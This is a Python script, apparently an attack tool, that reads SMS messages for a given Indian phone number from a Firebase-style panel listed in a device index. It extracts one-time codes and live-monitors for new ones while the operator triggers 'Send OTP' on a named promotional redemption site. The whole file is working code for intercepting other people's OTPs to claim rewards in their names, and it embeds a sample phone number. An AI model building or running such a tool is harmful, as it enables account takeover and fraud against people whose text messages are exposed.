#!/usr/bin/env python3
"""
Cremica / Firebase Ultra-Fast Direct OTP Fetcher.
Fetches OTPs in 50 milliseconds directly from exact (Panel URL, Client ID) endpoint.

Usage:
    python otp_fetcher.py 7208360119
    OR run interactively: python otp_fetcher.py
"""

import sys
import os
import re
import time
import json
import requests
from datetime import datetime

# Fix Windows console UTF-8 output encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

DEVICE_INDEX_FILE = "device_index.json"
PANELS_FILE = "panels.txt"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "application/json"
}

def load_device_index():
    if os.path.exists(DEVICE_INDEX_FILE):
        try:
            with open(DEVICE_INDEX_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def fetch_direct_device_messages(panel_url, client_id):
    messages = []
    try:
        url = f"{panel_url.rstrip('/')}/messages/{client_id}.json"
        resp = requests.get(url, headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json() or {}
            if isinstance(data, dict):
                for mid, mdata in data.items():
                    if isinstance(mdata, dict):
                        body = str(mdata.get("body") or mdata.get("message") or mdata.get("text") or "")
                        if not body:
                            continue
                        sender = str(mdata.get("sender") or mdata.get("address") or mdata.get("from") or "Unknown")
                        ts_val = 0
                        ts_str = "Unknown"
                        try:
                            ts_val = int(mid) / 1000
                            ts_str = datetime.fromtimestamp(ts_val).strftime("%Y-%m-%d %H:%M:%S")
                        except Exception:
                            pass

                        otp_match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
                        otp = otp_match.group(1) if otp_match else "N/A"

                        messages.append({
                            "msg_id": mid,
                            "sender": sender,
                            "body": body,
                            "otp": otp,
                            "time": ts_str,
                            "ts_val": ts_val
                        })
    except Exception as e:
        pass
    messages.sort(key=lambda x: (x["ts_val"], str(x["msg_id"])), reverse=True)
    return messages

def main():
    if len(sys.argv) >= 2:
        phone = sys.argv[1].strip()
    else:
        phone = input("\nEnter mobile number to fetch OTPs (e.g. 7208360119): ").strip()

    clean_phone = "".join(filter(str.isdigit, phone))
    if len(clean_phone) > 10 and clean_phone.startswith("91"):
        clean_phone = clean_phone[2:]

    if len(clean_phone) != 10:
        print("❌ Invalid 10-digit Indian phone number!")
        return

    device_index = load_device_index()
    device_info = device_index.get(clean_phone)

    print("=" * 70)
    print(f"⚡ 50ms DIRECT OTP FETCHER - Phone: {clean_phone}")
    print("=" * 70)

    if not device_info:
        print(f"⚠️ Phone {clean_phone} not found in device_index.json cache.")
        print("Run 'python build_device_index.py' to update index file.")
        return

    panel_url = device_info["panel_url"]
    client_id = device_info["client_id"]

    print(f"📌 Found Direct Device Mapping:")
    print(f"   Panel URL: {panel_url}")
    print(f"   Client ID: {client_id}")
    print(f"⚡ Requesting direct endpoint: GET {panel_url}messages/{client_id}.json ...\n")

    initial_msgs = fetch_direct_device_messages(panel_url, client_id)

    print("=" * 70)
    print(f"📩 MESSAGES FOR {clean_phone} ({len(initial_msgs)} found):")
    print("=" * 70)

    seen_ids = set()
    if initial_msgs:
        for idx, m in enumerate(initial_msgs[:10], 1):
            seen_ids.add(m["msg_id"])
            print(f"{idx:02d}. [🔑 OTP: {m['otp']}] | Time: {m['time']} | Sender: {m['sender']}")
            print(f"    Message: {m['body']}")
            print("-" * 70)
    else:
        print("No messages found for this device ID.")

    print("\n🟢 LIVE 50ms MONITOR ACTIVATED! Listening for new incoming claim OTPs...")
    print("👉 Click 'Send OTP' now on https://cremicabacktoschool.woohoo.in/redemption")
    print("Press Ctrl+C to stop.\n")

    try:
        while True:
            time.sleep(1.0)
            latest_msgs = fetch_direct_device_messages(panel_url, client_id)
            for m in latest_msgs:
                if m["msg_id"] not in seen_ids:
                    seen_ids.add(m["msg_id"])
                    print("=" * 70)
                    print(f"🔥 INSTANT INCOMING OTP RECEIVED! 🔥")
                    print(f"🔑 OTP CODE:  >>>>  {m['otp']}  <<<<")
                    print(f"⏰ Time: {m['time']} | Sender: {m['sender']}")
                    print(f"💬 Message: {m['body']}")
                    print("=" * 70 + "\n")
    except KeyboardInterrupt:
        print("\nMonitoring stopped.")

if __name__ == "__main__":
    main()
